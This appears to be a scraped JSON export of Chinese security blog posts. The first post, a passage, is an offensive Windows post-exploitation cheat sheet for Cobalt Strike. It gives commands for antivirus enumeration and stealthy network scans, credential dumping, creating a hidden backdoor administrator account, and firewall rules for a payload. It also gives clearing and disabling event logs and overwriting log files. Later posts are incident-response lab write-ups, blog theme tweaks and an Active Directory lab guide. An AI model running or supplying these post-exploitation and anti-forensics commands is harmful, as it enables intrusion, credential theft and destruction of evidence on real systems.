shell wmic process get Name,ProcessId,ExecutablePath 可以查看主机进程信息，并作出过滤进程路径，名称和pid。\n17. 指定查看路径信息 1 shell wmic process where Name=\u0026#34;有道云笔记.exe\u0026#34; get ExecutablePath 18. 查看补丁信息 1 shell wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn 19. 查看安装应用信息 1 shell wmic product get Caption,Version PS：在win10中，输入wmic /?会提示wmic已弃用，但在server2012R2,win7等版本可以正常使用\npowershell中可代替该命令的是：Get-WinObject：\n1 Get-WinObject -class win32_product | Select-object -property name,version 20. 查询本机服务 1 shell wmic server list brief 21. 查询目标主机上的杀毒软件 1 2 查询进程：shell tasklist， 或者：shell wmic process list brief 常见的杀软进程：\n进程名 软件 360sd.exe 360杀毒 360tray.exe 360实时保护 ZhuDongFangYu.exe 360主动防御 KSafeTray.exe 金山卫士 SafeDogUpdateCenter.exe 安全狗 McAfee McShield.exe McAfee egui.exe NOD32 AVP.exe 卡巴斯基 avhuard.exe 小红伞 bdagent.exe BitDefender 1 shell wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed 主动防御软件的安装路径\n1 shell wmic /namespace:\\\\root\\SecurityCenter2 path antiVirusProduct Get displayName,productstate,pathtosignedproductexe 22. 查看已启动的程序信息 1 shell wmic startup get command,caption 23. 查看计划任务 1 shell schtasks /query /fo LISR /v 24. 查看主机的开机时间 1 shell net statistics workstation 0x04 探测网段存活 高速内网扫描\n1 shell for /l %i in (1,1,255) do @ping -n 1 -w 30 192.168.12.%i | find /i \u0026#34;ttl= \u0026#34; 随机延迟+长超时\n1 shell for /l %i in (1,1,255) do @ping -n 1 -w 500 192.168.12.%i \u0026amp;\u0026amp; timeout /t 1 \u0026gt;null | find /i \u0026#34;ttl= \u0026#34; 这里看好有没有杀软edr再用，不然就是自首，除非你能二开工具。\n1. 利用betbios快速探测内网 工具：Nbtscan\n1 https://github.com/lifenjoiner/nbtscan 使用cs可以直接上传该脚本。\n1 shell nbscan.exe 10.10.20.0/24 2. 通过arp扫描完整探测内网 下载地址：\n1 https://github.com/QbsuranAlang/arp-scan-windows- 命令:\n1 shell arp.exe -t 10.10.20.0/24 3. 通过ARPScan脚本 下载地址：\n1 2 3 4 https://github.com/Hackplayers/Empire-mod-Hackplayers/tree/master 通过ARP协议进行扫描。 脚本名称：Invoke-ARPScan.ps1 命令：\n1 2 powershell-import powershell Invoke-ARPScan -CIDR 10.10.20.0/24 上传上去：\n执行该命令即可：\n0x05 针对⽂件内容的信息搜集 当对内⽹束⼿⽆策的时候，⼊⼝机器上⾯说不定藏着突破⼝，翻找本地的⽂件和建⽴的⽹络连接就是⼿法\n这⾥也提供⼀个⽂件内容敏感词的字典，需要可以⾃⼰去整理，如下:\n1 2 3 4 5 6 7 8 jdbc: user= password= key= ssh- ldap: mysqli_connect sk- 0x06 配置信息收集 1. web信息 1 run netstat -ano 2. 文档信息 1 2 shell dir /a /s /b c:\\*.xls shell dir /a /s /b c:\\*.doc 3. 查看最近打开的文档 1 shell dir %APPDATA%\\Microsoft\\Windows\\Recent 4. 查看微信信息 1 shell dir /s /b c:\\\u0026#34;WeChat Files\u0026#34; 0x07 网络资产搜集 1. 网络各种配置文件 通常再行动中，入口点都在泛OA，致OA，通OA，用NC等等。\n用NC解密：\n1 2 下载地址： https://github.com/1amfine2333/ncDecode 致OA解密：\n1 2 下载地址： https://github.com/m4yfly/OA-Seeyou 这些常见系统的配置文件地址要记住，如果是其他入口就多找找.config文件\n常见中间件及其配置目录：\n默认安装：\n中间件 目录1 目录2 MySQL C:\\ProgarmData\\MySQL\\MySQL Server C:\\Progarm Files\\MySQL\\MySQL Server SQL Server C:\\Progarm Files\\Miscrosoft SQL Server\\ Oracle Database C:\\app\\oracle\\product PostgreSQL C:\\Progarm Files\\PostgreSQL Redis C:\\Progarm Files\\Redis Apache C:\\Progarm Files\\Apache Group C:\\Progarm Files（x86）\\Apache Nginx C:\\nginx\\conf C:\\Progarm Files\\Nginx\\conf Tomacat C:\\Progarm Files\\Apache 1 2 3 4 C:\\Users\\XXX\\Desktop //用户桌面内容 C:\\Users\\XXX\\Dowloads //用户下载内容 C:\\Users\\XXX\\Documents //用户文档内容 C:\\Users\\XXX\\AppData\\Local //用户软件信息【仅个人安装选项】 0x08 内网工具 1. fscan 1 2 下载地址： https://github.com/shadow1ng/fscan 命令：\n1 2 3 fscan -h 10.10.20.0/24 -np -no -p 445,3389 -np on ping -pn 21指定不要扫描ftp端口，因为容易被查到 可以改名使用：\n1 2 最好改一下名字： mysql.exe -i 10.10.20.0/24 -np -m netbios ms17010扫描:\n1 mysql.exe -i 10.10.20.0/24 -np -m ms17010 常见端口扫描：\n1 mysql.exe -i 10.10.20.0/24 -np -p 22,2222,3389,1433,3306,1521,5432,6379 2. Kscan-轻量化全方位扫描器 1 2 下载地址 https://github.com/lcvvvv/kscan 3. dismap 1 2 下载地址： https://github.com/zhzyker/dismap 原则就是：\n安静 不被发现 尽量用正常的协议 尽量用改造过的工具 0x09 密码凭证收集 1. 主机密码 1 shell logonpasswords 1 shell hashdump dump lsass进程中的hash(巨龙拉东插件)\n1 2 下载地址： https://github.com/k8gege/Ladon 0x10 用户操作相关 1. 当前用户 1 2 3 shell whoami 一般用这个： shell echo %username% 2. 收集用户信息 查看⽤户名，查看⽤户信息\n1 2 net user net user ⽤户名 3. 在线⽤户 1 shell query user 4. 查看域管 1 shell net localgroup administrators 5. 激活Guest 1 2 3 4 shell net user guest /active:yes shell net user guest P@ssw0rd123 shell net localgroup administrators guest /add shell net localgroup administrators 6. 激活administrator 1 2 shell net user Administrator /active:yes shell net user Administrator P@ssw0rd123 7. 创建⽤户 1 2 shell net user ⽤户名 密码 /add #添加⽤户 shell net localgroup administrators ⽤户名 /add #将⽤户加到管理组 8. 创建后⻔⽤户 1 2 3 shell net user test$ P@ssw0rd123 /add shell net localgroup administrators test$ /add shell net localgroup administrators 0x11 查看防⽕墙相关 1 netsh firewall show config 关闭防⽕墙 1 2 netsh firewall set opmode disable //Windows Server 2003 系统及之前的版本 netsh advfirewall set allprofiles state off //Windows Server 2003 系统及之后的版本 ⼀般来说不要操作防⽕墙的开关，⻛险极⼤，只需要查看配置即可\n利⽤允许的⼊站端⼝:\n查看已放⾏端⼝:\n1 shell netsh firewall show portopening 根据防⽕墙配置，⽬标主机已放⾏ TCP 7001 端⼝的⼊站流量（对应 WebLogic 服务端⼝）。我们可以利⽤这个开放端⼝进⾏ Beacon 连接 这仅表示：\n添加防⽕墙规则:\n1 2 3 4 5 # 放⾏7001端⼝的⼊站流量（伪装为WebLogic） netsh advfirewall firewall add rule name=\u0026#34;WebLogic_Service\u0026#34; dir=in protocol=TCP localport=7001 action=allow # 放⾏CS⽊⻢进程路径（可选） netsh advfirewall firewall add rule name=\u0026#34;Java_Update\u0026#34; dir=in program=\u0026#34;C:\\Windows\\Temp\\payload.exe\u0026#34; action=allow 利⽤ ICMP 协议\n1 https://github.com/krabelize/icmpdoor DNS隧道\n1 https://github.com/iagox86/dnscat2 0x12 RDP操作相关 查看RDP端⼝ 1 shell reg query \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v PortNumber 为16进制数0xd3d，转换为10进制就是3389\n开放RDP服务 1 shell reg add \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\control\\Terminal Server\u0026#34; /v fDenyTSConnections /d 0 /t REG_DWORD /f 开放RDP端⼝ 1 shell netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow 离线破解RDP连接密码 查看是否存在凭证：\n1 shell dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 获取WiFi密码 查看连接过的Wifi名称：\n1 netsh wlan show profiles 如果乱码可以下载下来看\n1 shell netsh wlan show profiles \u0026gt; wlan.txt 查看指定Wifi的密码：\n1 netsh wlan show profile name=\u0026#34;WIFI名称\u0026#34; key=clear 查看代理 1 shell reg query \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\u0026#34; 0x13 ⽇志痕迹相关 清除事件⽇志 1 2 3 4 5 6 7 8 9 wevtutil cl \u0026#34;Windows PowerShell\u0026#34; wevtutil cl \u0026#34;Security\u0026#34; wevtutil cl \u0026#34;System\u0026#34; wevtutil cl \u0026#34;Application\u0026#34; Security：登录/特权操作记录 Windows PowerShell：PS执⾏历史 System：系统服务/驱动事件 Application：应⽤程序事件 停⽌⽇志相关服务 1 2 3 4 5 6 阻⽌新⽇志⽣成 禁⽤事件转发功能 中断⽇志记录链 sc stop Schedule sc stop wecsvc sc stop eventlog 永久禁⽤⽇志服务 1 sc config EventLog start= disabled ⽇志⽂件覆盖 1 2 3 4 5 # 物理覆盖⽇志⽂件 cipher /w:C:\\Windows\\System32\\winevt\\Logs\\Security.evtx 使⽤cipher⼯具进⾏3次覆盖写⼊ 防⽌⽂件恢复⼯具提取⽇志 0x13 CS插件 OLa 下载地址：\n1 https://github.com/d3ckx1/OLa/tree/main cs2插件，直接可以在cs2中使用：\ntaowu 下载地址：\n1 https://github.com/Mr-xn/taowu-cobalt-strike cs2插件\nLSTAR - Aggressor 下载地址：\n1 https://github.com/lintstar/LSTAR/ cs插件\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/13.webp","permalink":"http://localhost:57441/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"【内网攻防】Windows工作组信息收集"},{"content":"简介 题目来源公众号 vulntarget\n1 https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 任务环境说明：\nwindows账密：workstation/admin@20221123\nweb端口外部无法访问，请RDP连接上机排查\nflag1 主站进入后台的文件名称？\n查看apache日志，找到php后缀日志。\n1 flag{FNeSOgYGkp.php} flag2 黑客是从哪个端口上传木马文件的?\n打开小皮查看网页端口，7001打不开，所以为80\n1 flag{80} flag3 黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)\n直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。\n1 flag{api3.php:Admin} flag4 可以根据日志查看：\n1 flag{192.168.112.123} 完成！！！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/7.webp","permalink":"http://localhost:57441/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAvulntarget-j-01/","title":"【应急响应靶场】vulntarget-j-01"},{"content":"前景需要 1 2 3 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ 1. 黑客的IP地址 2. 遗留下的三个flag 虚拟机账号/密码\n1 2 账号/密码：defend/defend 账号/密码：root/defend 1. 黑客的IP地址 1 2 3 查看日志文件,Linux查看/var/log/wtmp文件查看可疑IP登陆 last -f /var/log/wtmp 或者直接使用命令 lastlog命令 可以看出192.168.75.129，非常可疑。 1 答案：192.168.75.129 2. 第一个flag 1 2 3 黑客使用root登录了系统，我们可以先去root用户下看看黑客使用了什么命令： 使用命令：history 得到第一个flag：thisismybaby 1 答案：flag{thisismybaby} 3. 第二个flag 1 2 3 4 5 从第一个flag中我们可以看出，黑客对/etc/rc.d/rc.local进行编辑和提升了执行权限 Linux中/etc/rc.d/rc.local 用于添加开机启动命令 我们cd /etc/rc.d/下，使用ls -la ，查看有rc.local，直接用cat rc.local得到第二个flag 1 答案：flag{kfcvme50} 4. 第三个flag 1 我们通过查看log日志，我们发现一个redis日志文件，然后看一下redis日志并没有什么结果，那么我们去看一下redis配置文件（more /etc/redis.conf）就得到第三个flag。 1 答案：flag{P@ssWrd_redis} 全部答案： 1 2 3 4 192.168.75.129 flag{thisismybaby} flag{kfcvme50} flag{P@ssW0rd_redis} ","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/8.webp","permalink":"http://localhost:57441/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/","title":"【知攻善防靶场】Linux1"},{"content":"前提须知 1 2 3 4 5 6 7 8 9 看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ （1）提交攻击者IP （2）提交攻击者修改的管理员密码(明文) （3）提交第一次Webshell的连接URL （4）提交Webshell连接密码 （5）提交数据包的flag1 （6）提交攻击者使用的后续上传的木马文件名称 （7）提交攻击者隐藏的flag2 （8）提交攻击者隐藏的flag3 虚拟机账号/密码：\n1 2 账号：root 密码：Inch@957821. 1. 提交攻击者IP 方法一： 1 2 首先看一下管理员登录情况，确定一下黑客登录IP 命令：last -f /var/log/wtmp 方法二： 1 2 如果不确定的话，我们可以登录bt面板看一下 这里我看var目录文件时，看到了bt配置文件，那就bt看一下 1 果然安装了宝塔，那就登录一下，因为不知道面板的密码那我们就直接修改一下面板的密码。 然后看一下面板的默认信息，看一下url地址\n1 2 3 4 5 外网面板地址: \u0026lt;https://58.247.126.6:12485/5a2ce72d\u0026gt; 内网面板地址: \u0026lt;https://192.168.198.130:12485/5a2ce72d\u0026gt; username: uysycv5w password: admin123 进行登录。 1 2 我们从bt面板里面看到了他添加了一个网站，我们去看一下他的日志（这里我就不用宝塔面板中的去查看日志了），我们首先去/www/wwwlogs目录下127.0.0.1.log 查看一下日志 使用命令：cat 127.0.0.1.log | gerp 200 1 答案：192.168.20.1 2. 提交攻击者修改的管理员密码(明文) 1 在宝塔面板发现一个phpmyadmin的mysql数据库，进管理看数据，找密码即可。 1 2 3 找到一个x2_user表，密码,这里使用过的是md5进行加密的，不清楚的可以去网上搜一下或者看一下源码，md5加密是不可逆的，但是可以在网上公开的网站进行解密： URL：\u0026lt;https://www.somd5.com/\u0026gt; 答案：Network@2020 1 答案：Network@2020 3. 提交第一次Webshell的连接URL 1 2 查看流量包，可以看出 index.php?user-app-register 1 Webshell的连接：\u0026lt;http://192.168.198.130/index.php?user-app-register\u0026gt; 4. 提交Webshell连接密码 1 根据题目3可以看出。 1 2 webshell密码是：Network2020 使用蚁剑进行连接。 5. 提交数据包的flag1 1 2 3 4 ls一下，你就会发现默认的文件夹下给了一个流量数据包，下载这个数据包使用wireshark进行分析。 [root@web-server ~]# ls anaconda-ks.cfg wp 数据包1.pcapng 1 首先，过滤一下http报文，可以看到这些报文都是攻击者192.168.20.1在访问Linux主机。 1 先浏览一下过滤出来的报文，发现攻击者访问了/flag1路径，追踪http流。 1 发现了一个第一个flag：flag1{Network@_2020_Hack}，提交判题程序得知正确。 1 答案：flag1{Network@_2020_Hack} 6. 提交攻击者使用的后续上传的木马文件名称 1 查看数据包，可以看出，黑客上传了一个version2.php文件。 1 答案：version2.php 7. 提交攻击者隐藏的flag2 1 根据命令可以看出，黑客进入了127.0.0.1文件夹，并创建了一个隐藏文件夹.api，进入后查看 1 可以看出他编辑了这两个文件，cat看一下。 1 cat alinotify.php,发现flag2。 1 答案：$flag2 = \u0026#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}\u0026#34;; 8. 提交攻击者隐藏的flag3 1 使用命令：history,查看历史使用过的命令可以发现 1 答案：flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} 全部答案： 1 2 3 4 5 6 7 8 192.168.20.1 Network@2020 \u0026lt;http://192.168.198.130/index.php?user-app-register\u0026gt; Network2020 flag1{Network@_2020_Hack} version2.php flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9} flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} ","date":"2025-08-28T00:00:00Z","image":"http://localhost:57441/images/14.webp","permalink":"http://localhost:57441/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/","title":"【知攻善防靶场】Linux2"},{"content":"题目解题 1、注册一个账户，登陆并添加一个账户\n2、通过转账功能，向ID为6的账户转账\n3、转账时抓包\n4、抓包后通过测试并发获取更多钱。\n5、两个ID相互转账并多次并发，得到最后的金额购买最后一个礼物，得到flag。\n","date":"2025-08-27T00:00:00Z","image":"http://localhost:57441/images/9.webp","permalink":"http://localhost:57441/p/ctf%E8%A7%82%E5%AE%89%E6%9D%AFctf-ezbank/","title":"【CTF】观安杯CTF-Ezbank"},{"content":"0x01 搭建方式 直接拉取我的github仓库文件即可：\n1 https://github.com/SSlimes/Blog 0x02 stack主题修改 1. 字体修改： 前往【100font】，下载自己想要的字体，字体文件为 fusion-pixel-10px-monospaced-zh_hans.ttf 把字体文件放入assets/font下(文件夹自己创建) 将以下代码修改并复制到layouts/partials/footer/custom.html文件中(文件不存在就自己创建) 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;style\u0026gt; @font-face { font-family: \u0026#39;字体名\u0026#39;; src: url({{ (resources.Get \u0026#34;font/字体文件名\u0026#34;).Permalink }}) format(\u0026#39;truetype\u0026#39;); } :root { --base-font-family: \u0026#39;字体名\u0026#39;; --code-font-family: \u0026#39;字体名\u0026#39;; } \u0026lt;/style\u0026gt; 2. 背景图片 将以下代码复制到layouts/partials/footer/custom.html文件中(文件不存在则自行创建)\n1 2 3 4 5 6 7 8 9 \u0026lt;style\u0026gt; body { background: url({{ (resources.Get \u0026#34;background/bz.png\u0026#34;).Permalink }}) no-repeat center top; background-size: cover; background-attachment: fixed; backdrop-filter: blur(50px); -webkit-backdrop-filter: blur(50px); /* 注意：这里建议和上面的模糊值保持一致，避免兼容问题 */ } \u0026lt;/style\u0026gt; 3. 首页欢迎横幅 在 /layouts/index.html 的 \u0026lt;section class=\u0026quot;article-list\u0026quot;\u0026gt; 前添加以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- 首页欢迎字幅 --\u0026gt; \u0026lt;div class=\u0026#34;welcome\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;font-size: 4rem; text-align: center; font-weight: bold; text-shadow: 0 2px 3px rgba(0,0,0,0.15);\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;shake\u0026#34;\u0026gt;👋\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text1\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt; Welcome\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text2\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt; To \u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text3\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;S\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text4\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;l\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text5\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;i\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text6\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;m\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text7\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;e\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text8\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;r\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text9\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text10\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;s\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text11\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt;Blog\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 首页欢迎字幅 --\u0026gt; 4. macOS风格的代码块 准备一张macOS代码块的红绿灯图片(Ctrl+S保存), 放到static/icons文件夹下 将以下代码复制进assets/scss/custom.scss文件中(不存在则自行创建) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 .highlight { border-radius: var(--card-border-radius); max-width: 100% !important; margin: 0 !important; box-shadow: var(--shadow-l1) !important; } .highlight:before { content: \u0026#34;\u0026#34;; display: block; background: url(../icons/macOS-code-header.svg) no-repeat 0; background-size: contain; height: 18px; margin-top: -10px; margin-bottom: 10px; } 5. 头像旋转 在 /assets/scss/custom.scss 中加入以下代码：\n1 2 3 4 5 6 7 8 // 头像旋转动画 .sidebar header .site-avatar .site-logo { transition: transform 1.65s ease-in-out; // 旋转时间 } .sidebar header .site-avatar .site-logo:hover { transform: rotate(360deg); // 旋转角度为360度 } ","date":"2025-08-27T00:00:00Z","image":"http://localhost:57441/images/2.webp","permalink":"http://localhost:57441/p/%E5%85%B6%E4%BB%96/","title":"【Hugo】hugo-stack主题魔改-1"},{"content":"博客运行时间 1. 完成样式 2. footer.html文件修改 在layouts\\partials\\footer\\footer.html目录下新增以下代码：（没有该文件则自己创建）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 {{ with .Site.Params.footer.runtimeSince }} \u0026lt;section class=\u0026#34;runtime\u0026#34; style=\u0026#34;margin-top:8px;font-size:1.3rem\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;site-runtime\u0026#34;\u0026gt;站点已运行计算中...\u0026lt;/span\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script\u0026gt; (function(){ var sinceStr = \u0026#39;{{ . }}\u0026#39;.replace(\u0026#39;T\u0026#39;,\u0026#39; \u0026#39;).replace(\u0026#39;t\u0026#39;,\u0026#39; \u0026#39;); var start = new Date(sinceStr); function update(){ var now = new Date(); var diff = Math.max(0, now - start); var days = Math.floor(diff / (24*60*60*1000)); var hours = Math.floor((diff % (24*60*60*1000)) / (60*60*1000)); var mins = Math.floor((diff % (60*60*1000)) / (60*1000)); var secs = Math.floor((diff % (60*1000)) / 1000); var el = document.getElementById(\u0026#39;site-runtime\u0026#39;); if(el){ el.textContent = \u0026#39;站点已运行 \u0026#39; + days + \u0026#39; 天 \u0026#39; + hours + \u0026#39; 小时 \u0026#39; + mins + \u0026#39; 分 \u0026#39; + secs + \u0026#39; 秒\u0026#39;; } } update(); setInterval(update, 1000); })(); \u0026lt;/script\u0026gt; {{ end }} 3. 修改config.yaml文件 在config.yaml文件下新增该内容即可\n1 runtimeSince: 2025-08-025T00:00:00 # 站点开始运行的时间（本地时区），用于页脚运行时间 4. 修改custom.scss文件按 让页脚运行时间颜色与版权一致。修改\\assets\\scss\\custom.scss文件。（没有自己创建即可）\n1 2 3 4 5 6 /* 页脚运行时间颜色与版权一致 */ footer.site-footer { .runtime { color: var(--accent-color); font-weight: bold; } ","date":"2025-08-27T00:00:00Z","image":"http://localhost:57441/images/3.webp","permalink":"http://localhost:57441/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%8D%9A%E5%AE%A2%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/","title":"【Hugo】hugo-stack主题魔改-博客运行时间"},{"content":"0x00 前置知识 需要三个windows_server虚拟机。\n这里我使用2012做主域，只能上相兼容不能向下兼容。\n使用windows_server_2012做主域，就不能使用2008做子域了。\n这就可以看出一般主域的服务器版本很低。\n三台服务器分别为（域控）（子域）（辅域）\n0x01 主域的搭建 修改网络配置为自定义的一个网段（192.16.100.1/24），为了确保都在同一网段。\n关闭防火墙\n设置IP地址：192.168.100.100为域控的IP，后续DNS服务器地址就是192.168.100.100。\n修改名称：此电脑-\u0026gt;属性，修改名称为：DC，然后重启一下。\n添加角色服务，Active Directory域服务和DNS服务器，安装好之后会自动重启一下即可。\n配置域环境，添加新林为：slimer.com后，进行等待，大约2分钟左右\n输入自己设置的密码即可（p-0p-0p-0..）\n下一步\n默认即可\n默认即可\n安装，然后重启一下，完成域控的搭建。\n重启完成后，将网卡重启一下，就可以看到域环境了。\n这里会多出来一个域防火墙，记得给关了。\n0x02 子域的搭建 关闭防火墙\n设置网卡为同一网段。\n设置IP地址，DNS为域控的IP地址。\n修改 计算机名称为:RODCServer 隶属于slimer.com域\n改： 计算机名改成administrator 密码为开机密码：p-0p-0p-0\n重启查看一下是否成功连接到slimer.com域\n安装域环境，选好之后，直接下一步安装即可。\n部署子域，新域名为：RODCServer。\n换一下自己机器的凭据。 账号：administrator 密码：p-0p-0p-0\n9.设置密码（满足复杂度） 密码：p-0p-0p-0..\n10.一直下一步，直到安装即可。\n11.在工具中找到 AD域和信任关系 就可以进行配置了，这里先这样后续再处理。\n0x03 辅域的搭建 只读域控，辅助域控\n只读域控制器（Read-only Domian Controller，RODC）的AD DS数据库只可以被读取，不可以被修改，也就是说用户或应用程序无法直接修改RODC 的AD DS数据库。RODC的AD DS数据库内容只能够从其他可读写的域控制器复制过来。RODC主要设计给远程分公司网络来使用的，因为一般来说远程分公 司的网络规模比较小，用户人数较少，此网络的安全措施或许并不如总公司完备，也可能缺乏IT技术人员，因此采用RODC可避免因其AD DS数据库被破坏 影响整个AD DS环境。\n辅助域控制器，在主域控不工作的事情下，辅助可以顶替他继续工作。\n安装SUBDCServer（辅域）\n注意：IP地址不要重复 要提前关闭防火墙\n修改IP（如上步骤）IP地址修改（与域控不同）但（首选DNS服务器选择域控IP）\n右击（这台电脑）然后点击（属性）再点击（更改配置）然后点击（更改）最后 计算机名改为（SUBDCServer） 属于选择（域）并添加为（slimer.com）\n改 计算机名（administrator） 密码（开机密码）p-0p-0p-0\n添加该两个功能，直接默认安装即可。\n将此服务器提升为域控制器即可。\n点击 将域控制器添加到现有域 点击 更改 输入域控用户和密码 账户：administrator 密码：p-0p-0p-0\n勾选域名系统服务器全局编录作为辅助域控输入密码（需要满足密码复杂性） 密码：p-0p-0p-0..\n复制自 选为 DC.slimer.com\n点击下一步 一直到 安装\n","date":"2025-08-27T00:00:00Z","image":"http://localhost:57441/images/1.webp","permalink":"http://localhost:57441/p/%E5%86%85%E7%BD%91%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-01/","title":"【内网】域环境搭建-01"}]